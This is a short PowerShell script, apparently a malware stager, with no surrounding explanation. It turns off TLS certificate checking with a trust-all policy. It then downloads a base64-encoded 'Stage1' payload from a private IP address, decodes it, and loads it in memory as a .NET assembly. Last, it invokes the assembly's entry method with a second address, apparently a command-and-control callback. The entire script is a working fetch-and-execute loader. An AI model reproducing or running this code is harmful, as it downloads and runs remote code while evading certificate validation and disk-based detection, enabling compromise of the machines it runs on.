add-type 'using System.Net;using System.Security.Cryptography.X509Certificates;public class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}';[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy;
$b64 = (iwr "https://192.168.56.102:443/Stage1.b64" -UseBasicParsing).Content
$b = [System.Convert]::FromBase64String([System.Text.Encoding]::ASCII.GetString($b64))
$a = [System.Reflection.Assembly]::Load($b)
$m =  $a.GetTypes().Where({ $_.Name -eq 'Stage' }, 'First').GetMethod('Entry', [Reflection.BindingFlags] 'Static, Public, NonPublic')
$m.Invoke($null,  'https:10.0.2.10:443')